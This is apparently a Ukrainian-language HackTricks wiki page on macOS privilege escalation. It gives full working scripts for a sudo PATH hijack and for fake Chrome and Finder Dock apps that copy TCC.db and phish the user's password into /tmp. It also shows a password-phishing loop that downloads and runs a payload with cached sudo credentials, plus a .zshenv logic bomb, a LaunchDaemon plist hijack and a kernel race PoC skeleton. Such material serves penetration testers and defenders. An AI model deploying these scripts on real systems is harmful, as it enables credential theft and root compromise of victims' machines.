# Підвищення привілеїв у macOS

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Якщо ви шукали TCC privilege escalation, перейдіть сюди:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Зверніть увагу, що **більшість трюків підвищення привілеїв, які стосуються Linux/Unix, також працюватимуть на машинах з MacOS**. Тож перегляньте:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Взаємодія з користувачем

### Sudo Hijacking

Оригінальну [техніку Sudo Hijacking можна знайти в матеріалі про Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Однак macOS **зберігає** `PATH` користувача, коли він виконує **`sudo`**. Це означає, що ще одним способом здійснити цю атаку було б **перехопити інші бінарні файли**, які жертва все одно виконає під час **запуску sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Зверніть увагу, що користувач, який працює в терміналі, найімовірніше, матиме **встановлений Homebrew**. Отже, можна перехопити бінарні файли в **`/opt/homebrew/bin`**.

### Dock Impersonation

За допомогою певної **social engineering** можна **видати себе, наприклад, за Google Chrome** у Dock і фактично виконати власний script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Деякі пропозиції:

- Перевірте в Dock, чи є там Chrome, і в такому разі **видаліть** цей запис та **додайте** **фальшивий** запис **Chrome на ту саму позицію** в масиві Dock.

<details>
<summary>Скрипт імперсонації Chrome у Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Деякі пропозиції:

- Ви **не можете видалити Finder з Dock**, тому якщо ви збираєтеся додати його в Dock, можна розмістити підроблений Finder одразу поруч зі справжнім. Для цього потрібно **додати запис підробленого Finder на початок масиву Dock**.
- Інший варіант — не розміщувати його в Dock, а просто відкрити: повідомлення «Finder хоче керувати Finder» не здається таким уже дивним.
- Ще один варіант **підвищити привілеї до root без запиту** пароля та жахливого вікна — змусити Finder насправді запитати пароль для виконання привілейованої дії:
- Попросіть Finder скопіювати в **`/etc/pam.d`** новий файл **`sudo`** (у запиті пароля буде вказано, що «Finder хоче скопіювати sudo»)
- Попросіть Finder скопіювати новий **Authorization Plugin** (ім’я файлу можна контролювати, тому в запиті пароля буде вказано, що «Finder хоче скопіювати Finder.bundle»)

<details>
<summary>Скрипт імітації Finder у Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Phishing через запит пароля + повторне використання sudo

Malware часто зловживає взаємодією з користувачем, щоб **перехопити пароль, придатний для sudo**, і програмно повторно його використати. Поширений процес:

1. Визначити користувача, який увійшов у систему, за допомогою `whoami`.
2. **Повторювати запити пароля** доти, доки `dscl . -authonly "$user" "$pw"` не поверне успішний результат.
3. Кешувати облікові дані (наприклад, у `/tmp/.pass`) і виконувати привілейовані дії за допомогою `sudo -S` (передавання пароля через stdin).

Мінімальний приклад ланцюжка:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Викрадений пароль можна повторно використати, щоб **очистити карантин Gatekeeper за допомогою `xattr -c`**, скопіювати LaunchDaemons або інші привілейовані файли та неінтерактивно запускати додаткові етапи.

## Специфічні для новіших версій macOS вектори (2023–2025)

### Застарілий `AuthorizationExecuteWithPrivileges` усе ще можна використовувати

`AuthorizationExecuteWithPrivileges` було оголошено застарілим у версії 10.7, але воно **досі працює в Sonoma/Sequoia**. Багато комерційних оновлювачів викликають `/usr/libexec/security_authtrampoline` із шляхом, який не є надійним. Якщо цільовий бінарний файл доступний для запису користувачу, можна розмістити троян і скористатися легітимним запитом:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Поєднайте з наведеними вище **masquerading tricks**, щоб створити правдоподібне діалогове вікно пароля.


### Тріаж привілейованого helper / XPC

Багато сучасних macOS privescs від сторонніх розробників використовують однаковий шаблон: **root LaunchDaemon** надає **Mach/XPC service** через **`/Library/PrivilegedHelperTools`**, після чого helper або **не перевіряє клієнта**, або перевіряє його **надто пізно** (PID race), або надає **root method**, яка використовує **шлях/скрипт, контрольований користувачем**. Саме цей клас помилок лежить в основі багатьох нещодавніх уразливостей helper у VPN-клієнтах, game launchers та updaters.

Короткий чекліст тріажу:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Звертайте особливу увагу на helpers, які:

- продовжують приймати запити **після uninstall**, оскільки job залишився завантаженим у `launchd`
- виконують scripts або читають configuration з **`/Applications/...`** чи інших шляхів, доступних для запису non-root користувачам
- покладаються на перевірку peer за **PID-based** або **bundle-id-only**, яку можна використати для race condition

Докладніше про authorization bugs у helpers див. [цю сторінку](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### PackageKit script environment inheritance (CVE-2024-27822)

До того, як Apple виправила цю проблему у **Sonoma 14.5**, **Ventura 13.6.7** і **Monterey 12.7.5**, інсталяції, ініційовані користувачем через **`Installer.app`** / **`PackageKit.framework`**, могли виконувати **PKG scripts як root у середовищі поточного користувача**. Це означає, що package із **`#!/bin/zsh`** завантажував би **`~/.zshenv`** атакувальника та виконував його як **root**, коли victim встановлював package.

Це особливо цікаво як **logic bomb**: достатньо отримати foothold в обліковому записі користувача та доступний для запису shell startup file, після чого залишиться чекати, поки користувач виконає будь-який вразливий **zsh-based** installer. Зазвичай це **не** стосується розгортань **MDM/Munki**, оскільки вони виконуються в середовищі root-користувача.
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
If you want a deeper dive into installer-specific abuse, also check [цю сторінку](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Якщо LaunchDaemon plist або його ціль `ProgramArguments` **доступні для запису користувачем**, ви можете підвищити привілеї, замінивши його, а потім змусивши launchd перезавантажити конфігурацію:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Це відтворює патерн exploit, опублікований для **CVE-2025-24085**, де writable plist використовувався для виконання коду attacker від імені root.

### XNU SMR credential race (CVE-2025-24118)

**Race в `kauth_cred_proc_update`** дає локальному attacker змогу пошкодити read-only credential pointer (`proc_ro.p_ucred)` шляхом виконання циклів `setgid()`/`getgid()` у різних потоках, доки не відбудеться torn `memcpy`. Успішне пошкодження забезпечує **uid 0** і доступ до kernel memory. Мінімальна структура PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
У поєднанні з heap grooming це дає змогу розмістити контрольовані дані там, де вказівник повторно зчитується. У вразливих збірках це надійний **local kernel privesc** без необхідності обходу SIP.

### SIP bypass через Migration Assistant ("Migraine", CVE-2023-32369)

Якщо ви вже отримали root, SIP усе одно блокує запис у системні розташування. Вразливість **Migraine** зловживає entitlement Migration Assistant `com.apple.rootless.install.heritable`, щоб запустити дочірній процес, який успадковує SIP bypass і перезаписує захищені шляхи (наприклад, `/System/Library/LaunchDaemons`). Ланцюжок:

1. Отримати root у запущеній системі.
2. Запустити `systemmigrationd` зі спеціально сформованим станом, щоб виконати контрольований зловмисником binary.
3. Використати успадкований entitlement для зміни захищених SIP файлів, зберігаючи persistence навіть після перезавантаження.

### Smuggling виразів NSPredicate/XPC (клас вразливостей CVE-2023-23530/23531)

Декілька Apple daemons приймають об’єкти **NSPredicate через XPC** і перевіряють лише поле `expressionType`, яким може керувати attacker. Створивши predicate, який виконує довільні selectors, можна досягти **code execution у root/system XPC services** (наприклад, `coreduetd`, `contextstored`). У поєднанні з початковим app sandbox escape це забезпечує **privilege escalation без user prompts**. Шукайте XPC endpoints, які десеріалізують predicates і не мають надійного visitor.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass і privilege escalation

**Будь-який користувач** (навіть непривілейований) може створити та змонтувати snapshot Time Machine за допомогою `-o noowners` і **отримати доступ до ВСІХ файлів** цього snapshot, обходячи перевірки власності на live volume. Єдиний необхідний privilege полягає в тому, щоб застосунок, який використовується (наприклад, `Terminal`), мав **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Команди та повне пояснення наведені на сторінці TCC bypasses:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Чутлива інформація

Це може бути корисним для privilege escalation:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
